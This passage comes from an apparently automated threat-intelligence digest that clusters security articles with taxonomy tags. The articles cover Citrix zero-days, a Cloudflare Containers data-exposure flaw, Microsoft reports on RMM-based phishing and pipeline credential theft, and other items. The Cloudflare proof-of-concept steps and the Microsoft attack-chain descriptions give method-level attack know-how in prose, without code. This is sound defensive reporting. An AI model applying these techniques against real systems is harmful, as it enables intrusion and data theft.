(“undefined”), and an explicit +08:00 creation timestamp. Both recovered spear-phishing messages also contain +08:00 date headers. UTC+8 alone is not geographically distinctive because it is used across mainland China, Taiwan, Hong Kong, Singapore, and other locations. However, the combination of the +08:00 offset, the zh-CN language tag and Simplified Chinese metadata is more consistent with a mainland Chinese environment than with Taiw
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: China-nexus UAT-11587 targets government and policy organizations across Asia with Antino backdoor
  - Published: 2026-09-30T10:00:01+00:00
  - Link: https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/
  - Summary: Cisco Talos uncovered a cluster of activity we track as UAT-11587 targeting government and policy organizations across Asia, including in Taiwan, India, the Philippines, and Cambodia, to deliver a previously undocumented backdoor referred to as “Antino” in developer artifacts.

### Cluster 486a6d24f0 — score 11

- Title: Higher education is under siege, and fragmented security is making it harder to respond
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-30T14:16:37+00:00
- Link: https://www.rapid7.com/blog/post/it-higher-education-under-siege-fragmented-security
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, zero_day
- affected_industries: education, financial_services, government
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, data_breach
- affected_industries: financial_services, government, education
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Higher education faces a difficult security equation. Universities hold large volumes of sensitive student, financial, health, and research data while supporting open networks, distributed users, legacy infrastructure, and increasingly complex cloud environments. Attackers have taken notice, and the pressure on security teams continues to grow. In Q2 2025, universities faced an average of 4,388 cyberattacks per organization per week, up 24% from the same period in 2024. Nine in ten universities reported experiencing a breach or security incident during the previous 12 months, while the average cost of a data breach in education reached $10.22 million. Confirmed attacks against higher education institutions exposed more than 3.9 million records in 2025, with ransomware continuing to disrupt teaching, research, financial aid, and administrative operations. Those figures are concerning on their own, but they only explain part of the problem. For university systems with multiple campuses,
```

#### Full body

```
Government Higher education is under siege, and fragmented security is making it harder to respond Rapid7 Sep 30, 2026 | Last updated on Sep 30, 2026 | 5 min read MORE ON RAPID7 SLED Higher education is under siege, and fragmented security is making it harder to respond Table of contents Higher education is under siege, and fragmented security is making it harder to respond MORE ON RAPID7 SLED Table of contents Higher education faces a difficult security equation. Universities hold large volumes of sensitive student, financial, health, and research data while supporting open networks, distributed users, legacy infrastructure, and increasingly complex cloud environments. Attackers have taken notice, and the pressure on security teams continues to grow. In Q2 2025, universities faced an average of 4,388 cyberattacks per organization per week, up 24% from the same period in 2024. Nine in ten universities reported experiencing a breach or security incident during the previous 12 months, while the average cost of a data breach in education reached $10.22 million. Confirmed attacks against higher education institutions exposed more than 3.9 million records in 2025, with ransomware continuing to disrupt teaching, research, financial aid, and administrative operations. Those figures are concerning on their own, but they only explain part of the problem. For university systems with multiple campuses, the way security is organized can create an additional layer of risk. Why is higher education so difficult to secure? Universities operate differently from most commercial organizations. Open access, collaboration, and academic freedom are central to their mission, which means security teams must protect environments where students, faculty, researchers, guests, and third parties connect from almost anywhere. That openness sits alongside an unusually broad mix of sensitive data. A single university may hold student PII, financial aid and tax records, health information, proprietary research, government-funded projects, and intellectual property. Many institutions also rely on legacy systems that have been connected over time to modern cloud applications, APIs, learning platforms, and research networks, creating visibility gaps that can be difficult to manage. Resource pressure adds to the challenge. The draft cites 94% of higher education IT leaders as saying they lack enough personnel to defend their environments adequately, leaving relatively small teams responsible for sprawling networks with large numbers of users, devices, applications, and third-party services. Why multi-campus fragmentation increases cyber risk For multi-campus university systems, many of these pressures are compounded by decentralized security operations. Individual campuses often maintain their own infrastructure, security tools, teams, incident response processes, vendor relationships, and renewal cycles. The result can be limited visibility across the wider institution. If ransomware is detected at one campus, teams elsewhere may have no immediate view of the same attacker activity. If a zero-day is exploited in one research environment, another campus may remain exposed because the intelligence and response process stay local. Fragmentation also affects efficiency. When each campus independently buys, deploys, and manages its own security stack, the wider university system can carry duplicated costs, additional management overhead, and inconsistent coverage. Fragmentation can also slow the spread of threat intelligence across a university system. If one campus detects a new attack pattern, an unusual intrusion technique, or previously unseen malware, that insight may remain local rather than reaching security teams elsewhere in time to act. A suspicious login sequence identified at Campus B, for example, could be the early signal of activity already moving toward Campus A or Campus C, but without shared visibility each team may investigate the same threat indep
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Higher education is under siege, and fragmented security is making it harder to respond
  - Published: 2026-09-30T14:16:37+00:00
  - Link: https://www.rapid7.com/blog/post/it-higher-education-under-siege-fragmented-security
  - Summary: Higher education faces a difficult security equation. Universities hold large volumes of sensitive student, financial, health, and research data while supporting open networks, distributed users, legacy infrastructure, and increasingly complex cloud environments. Attackers have taken notice, and the pressure on security teams continues to grow. In Q2 2025, universities faced an average of 4,388 cyberattacks per organization per week, up 24% from the same period in 2024. Nine in ten universities reported experiencing a breach or security incident during the previous 12 months, while the average cost of a data breach in education reached $10.22 million. Confirmed attacks against higher education institutions exposed more than 3.9 million records in 2025, with ransomware continuing to disrupt teaching, research, financial aid, and administrative operations. Those figures are concerning on their own, but they only explain part of the problem. For university systems with multiple campuses,

### Cluster ee15270475 — score 11

- Title: How Cloudflare addressed a cross-tenant data exposure vulnerability in Containers
- Source: Cloudflare Security (cloud_identity_infrastructure)
- Published: 2026-09-24T15:00:00+00:00
- Link: https://blog.cloudflare.com/containers-cross-tenant-vulnerability/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
External security researchers at Accomplish identified a vulnerability in Cloudflare Containers that could expose residual disk data from previous workloads. We explain how the issue worked, how we investigated it, and the steps we took to remediate it.
```

#### Full body

```
On September 4, 2026, Oren Yomtov, a security researcher from Accomplish , responsibly reported a vulnerability affecting Cloudflare Containers and Cloudflare Sandboxes (which is built on Containers), through Cloudflareâs bug bounty program . Cloudflare has fully remediated the vulnerability, and we have no evidence that customer data has been compromised.Â This post was prepared in collaboration with Oren Yomtov and the Accomplish security research team, whose detailed report and controlled testing helped us validate the issue and respond quickly. Cloudflare Containers run workloads on multi-tenant infrastructure and automatically assign them to eligible servers; customers cannot select the underlying host. The researchers demonstrated that a customer with a Workers Paid account could recover residual disk blocks previously used by Containers on the same host. The technique could not target a particular customer, workload, host, or data, and residual data was not guaranteed to be present. Cloudflare applied a fix across the Containers fleet, with no customer-side configuration changes required. Within the historical disk-I/O telemetry available to us, we identified no evidence of malicious exploitation. Activity we could attribute to the reported technique came from the researchers and Cloudflare engineers conducting authorized validation. Here, we explain the underlying storage behavior, its potential impact, our investigation, and the actions we took in response. How container storage allocation worksÂ Cloudflare Containers use Linux device mapper thin provisioning (dm-thin) to provide each container with a writable root disk. Each container lives inside a dedicated virtual machine powered by the Firecracker virtual machine monitor. Firecracker presents this disk to the virtual machine as /dev/vdc. Thin provisioning allocates physical storage only when a virtual disk writes to a previously unmapped region. The affected storage pools used a 64 KiB thin-block size. When the thin volume backing a container's root disk was deleted, its physical blocks were returned to a pool that served workloads belonging to multiple customer accounts. The affected pool configuration included the following option: skip_block_zeroing With this option configured, dm-thin skips zeroing newly allocated blocks before making them accessible. Consequently, when a previously-used 64 KiB block was reassigned, a full-block write replaced its previous contents, but a smaller write changed only the written portion. The remainder could retain data from the blockâs previous owner. How the exploit worked Reading an unmapped region of a new thin disk did not reveal residual data. For an unmapped region of the thin device, dm-thin returned zeroes without allocating a physical block. The proof of concept identified 64 KiB-aligned regions corresponding to free space in the guestâs ext4 filesystem and wrote one aligned 4 KiB block into each region. When such a write reached an unmapped thin block, dm-thin allocated a physical 64 KiB block from the shared pool. The 4 KiB write replaced only that portion of the block, and because block zeroing was disabled, the remaining 60 KiB could retain data from a previous container. A subsequent raw-device read could therefore observe bytes that the new container had never written. The proof of concept performed the following steps: Create a container using a Workers Paid account. Open the writable root disk at /dev/vdc . Read the disk and record a baseline. Write one 4 KiB block into each selected 64 KiB region corresponding to ext4 free space. Read the resulting blocks again. Examine only the portions not overwritten by the new container. The submission included counts, block offsets, sizes, checksum results, and truncated hash prefixes. Although the researchers recovered raw blocks to validate the issue, the materials provided to Cloudflare contained no third-party filenames, identifiers, credentials, hostnames, addr
```

#### Corroborating sources (1)

- **Cloudflare Security** (cloud_identity_infrastructure)
  - Title: How Cloudflare addressed a cross-tenant data exposure vulnerability in Containers
  - Published: 2026-09-24T15:00:00+00:00
  - Link: https://blog.cloudflare.com/containers-cross-tenant-vulnerability/
  - Summary: External security researchers at Accomplish identified a vulnerability in Cloudflare Containers that could expose residual disk data from previous workloads. We explain how the issue worked, how we investigated it, and the steps we took to remediate it.

### Cluster 95fa8e8b4c — score 11

- Title: Case Study: How Does IBM Turn Open Source Participation Into Enterprise and Career Value?
- Source: OpenSSF Blog (ai_security_agentic_risk)
- Published: 2026-09-25T14:38:45+00:00
- Link: https://openssf.org/blog/2026/09/25/how-does-ibm-turn-open-source-participation-into-enterprise-and-career-value/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
IBM’s Jamie Thomas explains how intentional participation in open source communities and OpenSSF drives business strategy, improves software supply chain security, and creates career growth opportunities.
```

#### Full body

```
IBM’s experience shows how contributing to open source can support business strategy, inform security decisions, and develop the people who lead technology forward. Through OpenSSF, that participation brings enterprise experience into a community working to secure the software upon which everyone depends. For Jamie Thomas, open source comes with a responsibility: understand what you use and help sustain it. In her conversation with CRob for Big Thoughts, Open Sources , published June 16, 2026, Thomas describes how IBM’s journey through Java, Linux, and Red Hat shaped its approach to enterprise participation. As IBM Enterprise Security Executive and an OpenSSF Governing Board member and former chair, she connects that history to a practical challenge: turning dependence on open source into intentional stewardship. “If you are a direct consumer of open source, do it with intent.” – Jamie Thomas, IBM What Does Open Source Commitment Look Like at Scale? IBM’s investments demonstrate the strategic importance of open source, while OpenSSF provides practical resources for organizations managing their dependencies. $5 billion Approximately $34 billion $3.4B in Red Hat annual revenue IBM and Red Hat commitment to Project Lightwell, an AI-driven security model. Equity value of IBM’s Red Hat acquisition, completed in July 2019. Red Hat’s fiscal year 2019 revenue, up 15% year over year before the acquisition. Project Lightwell Red Hat acquisition announcement Red Hat’s reported revenue What Challenge Did IBM Need to Solve? IBM needed to engage developers at scale while helping enterprise customers run open source reliably and securely. Thomas recalls IBM’s early recognition that building a broad Java ecosystem required a different approach to software development. IBM invested in Linux contributors and opened its Java development tooling through Eclipse, giving developers a shared foundation on which to build. The transition involved real debate. Thomas remembers customers arguing over whether Linux belonged on IBM mainframes. The benefit that emerged was portability: software developed for Linux could reach different hardware platforms. As adoption expanded, the questions changed. Enterprise customers wanted to know who would maintain the software, support its operation, and address security needs. Experimenting with a project was one step. Depending on it in production required sustained care. Why Does IBM Participate in OpenSSF? OpenSSF gives IBM a place to learn from other organizations, contribute enterprise security experience, and help shape shared approaches. Thomas joined OpenSSF’s Governing Board at its beginning. In the interview, she recalls SolarWinds and Log4j as significant events during her move into enterprise security, underscoring the importance of understanding risks across the software supply chain. For IBM, participation helps keep the company informed about an evolving security landscape. It also creates opportunities to bring enterprise needs into discussions alongside startups, maintainers, and other software consumers. Thomas emphasizes that software extends beyond the boundaries of any single company. Participation gives organizations a way to explain their requirements, understand competing perspectives, and contribute to decisions affecting the projects upon which they rely. How Does IBM Connect Open Source Contribution to Business Value? IBM connects community innovation with developer adoption, platform capabilities, and enterprise support. Thomas explains that IBM’s investment in Linux helped expand its use across IBM platforms, giving customers greater portability and flexibility. Its acquisition of Red Hat deepened the company’s connection to open source communities and expanded its ability to reach developers. Red Hat demonstrates how open source can support a commercial business through curation, maintenance, and enterprise support. Those capabilities help organizations move from experimenting with soft
```

#### Corroborating sources (1)

- **OpenSSF Blog** (ai_security_agentic_risk)
  - Title: Case Study: How Does IBM Turn Open Source Participation Into Enterprise and Career Value?
  - Published: 2026-09-25T14:38:45+00:00
  - Link: https://openssf.org/blog/2026/09/25/how-does-ibm-turn-open-source-participation-into-enterprise-and-career-value/
  - Summary: IBM’s Jamie Thomas explains how intentional participation in open source communities and OpenSSF drives business strategy, improves software supply chain security, and creates career growth opportunities.

### Cluster 3cbda62f73 — score 11

- Title: Inside the OpenSSF Summer Mentorship Showcase: How Emerging Developers Are Strengthening Supply Chain Security
- Source: OpenSSF Blog (ai_security_agentic_risk)
- Published: 2026-09-24T19:32:24+00:00
- Link: https://openssf.org/blog/2026/09/24/inside-the-openssf-summer-mentorship-showcase-how-emerging-developers-are-strengthening-supply-chain-security/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
At OpenSSF, securing the open source software supply chain isn’t just about writing code or establishing policies. It is about growing the community of developers who build, maintain, and innovate these tools.
```

#### Full body

```
By Stacey Potter At OpenSSF, securing the open source software supply chain isn’t just about writing code or establishing policies. It is about growing the community of developers who build, maintain, and innovate these tools. In our recent OpenSSF Welcome Call: Summer Mentorship Lightning Showcase , mentors and mentees gathered to demo the fruits of their summer collaboration. From securing repository signing keys to building human-readable visualizers for complex cryptographic chains, this year’s cohort demonstrated how fresh perspectives directly enhance ecosystem security. Here is a look at what our mentees accomplished, what they learned along the way, and where these critical projects are heading. Expanding Repository Security: Role-Specific Online Keys in RSTUF In the Repository Service for TUF (RSTUF) ecosystem, managing trust and signing capabilities at scale is crucial. Mentee Amay Dixit (an undergraduate at IIT Bhilai) worked alongside mentors Srinjoy Dutta and Kairo de Araujo to address a major challenge in repository key management: scoping down key compromise impact. Historically, an RSTUF deployment could use a shared global online signing key for repository metadata, including delegated metadata for projects hosted in the repository. For a multi-project repository, this meant that a compromise of the shared key could potentially affect the metadata of multiple projects. Amay developed functionality enabling role-specific signing keys for succinct hash bin delegations and added commands to update existing delegations. Now, individual project delegations can sign their own release metadata with their own keys without the repository ever needing to hold the private half. If an individual project key is leaked, the blast radius is isolated strictly to that project, keeping the rest of the repository completely safe. “The version that survived the review from my mentors is simpler and much closer to the actual deliverables… Tests tell you the pieces are correct, but they don’t tell you the whole system works until you run it end-to-end.” — Amay Dixit, OpenSSF Mentee Demystifying Cryptography: The RSTUF Metadata Visualizer While security frameworks like The Update Framework (TUF) provide robust protection, reading raw JSON metadata filled with base64 signatures and cryptographic key IDs can be daunting for repository operators. To solve this, mentees Yashasvi Yadav and Diya Sharma teamed up with mentor Srinjoy Dutta to build the RSTUF Metadata Visualizer – a dedicated web interface that runs natively inside an RSTUF deployment. Key highlights of their work include: Security-First Architecture : Rather than parsing raw JSON from an unverified database, the backend leverages `python-tuf` to validate the entire cryptographic trust chain from the trusted root before displaying it. At-a-Glance Repository Health : Operators can immediately see the status, expiration countdowns, and signers for `root`, `timestamp`, `snapshot`, and `targets` roles. Delegation Graph & Artifacts Panel : Displays delegation hierarchies as an interactive tree graph and allows admins to inspect artifact file hashes and download verified raw metadata directly. “The subtitle of our project is the entire pitch: ‘Making Cryptographic Metadata Actually Readable for Humans.’ When you open raw files, it’s hard to answer a simple question like, ‘Is the repository currently valid?’ The visualizer answers that instantly.” — Diya Sharma, OpenSSF Mentee Looking ahead, the long-term goal is to expand the visualizer beyond a read-only dashboard into a complete administrative tool capable of initiating signing ceremonies, releasing artifacts, and eventually serving as an intuitive web alternative to the CLI. Streamlining Version Control Security: Enhancing Developer UX in gittuf While repositories rely heavily on cryptographic signatures and access controls, getting developers to adopt security tools depends heavily on user experience. gittuf – a project that l
```

#### Corroborating sources (1)

- **OpenSSF Blog** (ai_security_agentic_risk)
  - Title: Inside the OpenSSF Summer Mentorship Showcase: How Emerging Developers Are Strengthening Supply Chain Security
  - Published: 2026-09-24T19:32:24+00:00
  - Link: https://openssf.org/blog/2026/09/24/inside-the-openssf-summer-mentorship-showcase-how-emerging-developers-are-strengthening-supply-chain-security/
  - Summary: At OpenSSF, securing the open source software supply chain isn’t just about writing code or establishing policies. It is about growing the community of developers who build, maintain, and innovate these tools.

### Cluster 5fc59e5ed7 — score 11

- Title: Citrix Patches Critical Zero Days Under Active Exploitation
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-09-28T08:30:00+00:00
- Link: https://www.infosecurity-magazine.com/news/citrix-patches-critical-zero-days/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos, zero_day
- actor_attribution: Salt Typhoon
- affected_industries: government
- affected_products: AWS, Citrix, Microsoft Windows
- cve_ids: CVE-2026-88771, CVE-2026-88772, CVE-2026-88773, CVE-2026-88774, CVE-2026-88775
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, ddos, active_exploitation
- actor_attribution: Salt Typhoon
- affected_industries: government
- affected_products: Microsoft Windows, Citrix, AWS
- cve_ids: CVE-2026-88771, CVE-2026-88772, CVE-2026-88773, CVE-2026-88774, CVE-2026-88775
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Citrix has confirmed exploitation of two critical zero-day RCE bugs
```

#### Full body

```
Infosecurity Magazine Home » News » Citrix Patches Critical Zero Days Under Active Exploitation Citrix Patches Critical Zero Days Under Active Exploitation News 28 September 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster Citrix has published updates for eight new vulnerabilities, including two critical zero-day CVEs that had been under active exploitation. In a bulletin on September 27 the vendor confirmed eight new flaws in Citrix NetScaler ADC (formerly Citrix ADC) and Citrix NetScaler Gateway (formerly Citrix Gateway). They have CVSS scores ranging from 7 to 9.5. The two most urgent are: CVE-2026-88771: a remote code execution (RCE) flaw due to improper input validation, enabling an unauthenticated attacker to execute arbitrary commands. It affects all NetScaler ADC and NetScaler Gateway deployments with default configuration CVE-2026-88772: a memory overflow vulnerability leading to RCE or denial of service. It affects any deployment with DTLS configuration enabled (which it is by default on VPN vServers) “Exploitation of CVE-2026-88771 and CVE-2026-88772 on unmitigated NetScaler deployments has been observed,” Citrix said in a blog post. “Citrix strongly urges affected customers to install the relevant updated versions as soon as possible.” Read more on Citrix vulnerabilities: Citrix Urges Immediate Patching for Critical NetScaler Vulnerabilities Also noteworthy is CVE-2026-88773, a critical HTTP request smuggling flaw which is present when the HTTP configuration is enabled on NetScaler ADC or NetScaler Gateway. It has a CVSS score of 9.3. Reports had been circulating before the Citrix bulletin of exploitation of the zero-day bugs. The Australian Signals Directorate’s Australian Cyber Security Centre (ACSC) issued a critical alert on September 28 urging organizations to patch. Reports online also suggested the Dutch National Cyber Security Center (NCSC-NL) had issued alerts to local organizations in the country. The US Cybersecurity and Infrastructure Security Agency (CISA) has ordered federal agencies to patch by Wednesday, 30 September. It’s not clear who is behind the exploitation attempts but in 2025, a cyber intrusion linked to China-based group Salt Typhoon targeted a Citrix zero day. The Remaining Five Vulnerabilities The rest of the CVEs published by Citrix include: CVE-2026-88774: a feature policy bypass due to improper HTTP URL based expression usage (CVSS 7) CVE-2026-88775: a memory overflow vulnerability leading to unpredictable or erroneous behavior or denial of service (CVSS 8.8) CVE-2026-88776: a memory overflow vulnerability leading to unpredictable or erroneous behavior or denial of service (CVSS 8.8) CVE-2026-88777: a memory overflow vulnerability leading to unpredictable or erroneous behavior or denial of service (CVSS 8.8) CVE-2026-88778: a TCP Initial Sequence Number (ISN) prediction flaw with a (CVSS 8.8) “This bulletin only applies to customer-managed Citrix NetScaler ADC and Citrix NetScaler Gateway,” the vendor confirmed. “Cloud Software Group upgrades the Citrix-managed cloud services and Citrix-managed Adaptive Authentication with the necessary software updates.” You may also like Zero-Day IE Bug is Being Exploited in the Wild News 21 January 2020 Last Windows 10 Patch Tuesday Features Six Zero-Days News 15 October 2025 NCSC: Patch Critical Oracle EBS Bug Now News 7 October 2025 Citrix Patches Three NetScaler Zero Days as One Sees Active Exploitation News 27 August 2025 768 CVEs Exploited in the Wild in 2024 News 3 February 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Deepfakes Are Becoming a Costly Reality for Businesses, Report Warns News 28 September 2026 1 Japanese Railway Operators Hit with Weekend Cyber Attacks News 29 September 2026 2 Amazon Bedrock AgentCore Flaws Could Expose AWS Credentials News 29 September 2026 3 Trump, Six AI Giants Sign 'Super Intelligence' Safety Accord News 30 Septem
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Citrix Patches Critical Zero Days Under Active Exploitation
  - Published: 2026-09-28T08:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/citrix-patches-critical-zero-days/
  - Summary: Citrix has confirmed exploitation of two critical zero-day RCE bugs

### Cluster 48be01e909 — score 10

- Title: Phishing Abuses RMM Tools for Persistent Access
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-29T21:39:27+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: GitLab, Microsoft Defender, ScreenConnect
- tools_used: ScreenConnect
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_products: ScreenConnect, Microsoft Defender, GitLab
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft observed phishing campaigns that abused MSP360 RMM to deploy ScreenConnect, creating redundant remote-access channels for follow-on activity The post Phishing Abuses RMM Tools for Persistent Access appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Phishing Social engineering Content types Research Products and services Microsoft Defender Microsoft Defender Experts Topics Actionable threat insights Threat intelligence In July 2026, Microsoft Defender Experts observed phishing campaigns targeting organizations across multiple industries that distributed a masqueraded MSP360 Remote Monitoring and Management (RMM) installer through meeting invitations, PDF-themed lures, software update prompts, and other social-engineering content. Once executed, the legitimate MSP360 installer, distributed under a deceptive file name established remote management access on affected devices and enabled threat actors to gain an initial foothold using trusted administrative software. Microsoft observed the MSP360 deployment being used to download and install a ConnectWise ScreenConnect client, creating a secondary remote-access channel that provided redundant access to compromised systems. Microsoft did not observe exploitation of ScreenConnect software itself; rather, threat actors abused legitimately obtained remote administration software to establish and maintain access. After access was established, threat actors used these remote administration channels to deploy additional tools and conduct post-compromise activity, including information collection and credential-access operations. This activity highlights how threat actors continue to abuse legitimate remote administration software to blend into normal IT operations while maintaining persistent access and reducing detection opportunities. Microsoft Defender for Endpoint detects suspicious and uncommon remote-management activity, while the hunting queries and mitigations in this post can help organizations identify and restrict unapproved RMM use. Attack chain overview The observed multi-stage intrusion chain began when phishing lures delivered a legitimate, digitally signed MSP360 RMM v2.5.0.67 installer under deceptive filenames. Following successful User Account Control (UAC) elevation, the installer established MSP360 services for persistent access and leveraged the RMM agent to invoke PowerShell, download, and silently install ConnectWise ScreenConnect. This effectively introduced a second remote administration channel on the compromised device, which the threat actor subsequently used to transfer and execute additional tooling supporting credential access, local data collection, and other post-compromise activity. Figure 1. Attack chain showing phishing delivering a masqueraded MSP360 RMM installer that deploys ScreenConnect for persistent remote access and follow-on activity. Initial Access: Phishing Campaign Delivering Masqueraded MSP360 RMM Installer Microsoft observed multiple phishing campaigns that used a multi-stage delivery chain to distribute legitimate, digitally signed MSP360 RMM software (v2.5.0.67). Phishing emails directed users to actor-controlled landing pages that impersonated document-sharing portals, invitation workflows, Adobe Reader download pages, Zoom installation pages, and business collaboration platforms. Upon user interaction, victims were redirected to download locations hosted on both attacker-controlled infrastructure and legitimate cloud services including Amazon S3, Cloudflare R2, Dropbox, GitLab, and Supabase. The downloaded executables used filenames crafted to resemble legitimate business content, meeting invitations, PDF documents, and software installers. Analysis of downloaded samples showed that many ultimately contained the same MSP360 RMM installer package despite appearing as different files to the victim. MSP360 SHA256: 108ef7e628d7a20bd6241a5b57149e27a6061f467123eb64061975559f8f73dc MSP360 SHA1: f34330d4c6e0aa978dc3af40360c14b31ad51127 Observed lure themes: We have observed the threat actor using multiple social-engineering themes, including: Workplace meeting requests Zoom and Google Meet installation prompts Adobe Acrobat and PDF reader updates RSV
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Phishing Abuses RMM Tools for Persistent Access
  - Published: 2026-09-29T21:39:27+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/
  - Summary: Microsoft observed phishing campaigns that abused MSP360 RMM to deploy ScreenConnect, creating redundant remote-access channels for follow-on activity The post Phishing Abuses RMM Tools for Persistent Access appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Phishing Abuses RMM Tools for Persistent Access
  - Published: 2026-09-29T21:39:27+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/
  - Summary: Microsoft observed phishing campaigns that abused MSP360 RMM to deploy ScreenConnect, creating redundant remote-access channels for follow-on activity The post Phishing Abuses RMM Tools for Persistent Access appeared first on Microsoft Security Blog .

### Cluster a89ee14154 — score 10

- Title: ​​Beyond source code: A path to the keys to the kingdom
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-29T16:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/29/beyond-source-code-a-path-to-the-keys-to-the-kingdom/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: critical_infrastructure
- affected_products: Azure, Kubernetes, Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: critical_infrastructure
- affected_products: Kubernetes, Azure, Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Explore how Storm-3068 turned a compromised identity into broader cloud access and the steps organizations can take to defend their identities, pipelines, and cloud infrastructure. The post ​​Beyond source code: A path to the keys to the kingdom appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Content types Best practices Products and services Microsoft Defender Experts Microsoft Defender Experts Cybersecurity Incident Response Topics Cloud security Incident response Security management Threat trends What began as a single compromised identity quickly expanded into an organization’s development and cloud environments. In our latest Cyberattack Series report, we examine how the Microsoft Detection and Response Team (DART)—the team that delivers Microsoft Defender Experts Cybersecurity Incident Response —investigated activity by Storm-3068 , a threat actor that turned a successful self-service password reset into access to Azure DevOps, development pipelines, and Kubernetes resources. By leveraging legitimate identity and cloud services rather than malware or software exploits, the threat actor established persistent access, enumerated repositories, and obtained credentials that opened a path into connected cloud infrastructure. This case highlights a growing challenge for defenders: when identities, source code, pipelines, and production environments are tightly linked, a single account compromise can provide a pathway to much broader access across the organization. Read on to learn more or access the full report . Read the full cyberattack report What happened? The intrusion began with Storm-3068 gaining access to a user account through a self-service password reset process and then taking full control of the identity by registering its own authentication methods. With persistent access established, the threat actor shifted its focus to Azure DevOps using legitimate administrative tools and automated scripts to enumerate repositories, projects, pipelines, and deployment environments. TACTIC: Trusted pipelines were exploited Rather than deploying malware, the threat actor modified development pipelines to collect Kubernetes credentials and expand access into cloud infrastructure.​​ Azure DevOps proved to be a high-value target because it sat at the intersection of identity, software development, and cloud operations. By mapping trusted deployment paths and connected resources, the threat actor was able to identify opportunities to expand beyond the initial compromise. The investigation revealed that Storm-3068 created a malicious pipeline designed to harvest Kubernetes credentials at scale. The pipeline deployed a kube agent and executed multiple jobs intended to collect kubeconfig files containing cluster connection details and authentication information. Leveraging the permissions of the compromised account, the threat actor deployed the pipeline that was authorized to access more than 50 resources and authenticated to services. In addition to deploying a kube agent, the threat actor modified pipeline scripts to install the Atera remote management agent and download the Chisel tunneling utility. These tools were deployed in an attempt to provide the threat actor with alternative mechanisms for remote access and to expose the Kubernetes API server. Chisel commands were executed to establish a reverse tunnel to an external IP address to enable potential remote interaction with the Kubernetes clusters. Using Azure DevOps audit logs and Git version history, investigators reconstructed the next stage of the intrusion. The threat actor added seven stolen kubeconfig files to a repository, providing the credentials needed to access targeted Kubernetes clusters. INSIGHT: Azure DevOps can reveal much more than source code Repositories, pipelines, service connections, and deployment settings can provide threat actors with a roadmap to an organization’s broader environment. How did Microsoft respond? Once engaged, DART moved quickly to investigate the intrusion and disrupt the threat actor’s access. By analyzing telemetry across identity systems, development platforms, and cloud infrastructure, the team pieced together how the cyberattack unfolded and identified where the threat actor had expand
```

#### Corroborating sources (1)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: ​​Beyond source code: A path to the keys to the kingdom
  - Published: 2026-09-29T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/29/beyond-source-code-a-path-to-the-keys-to-the-kingdom/
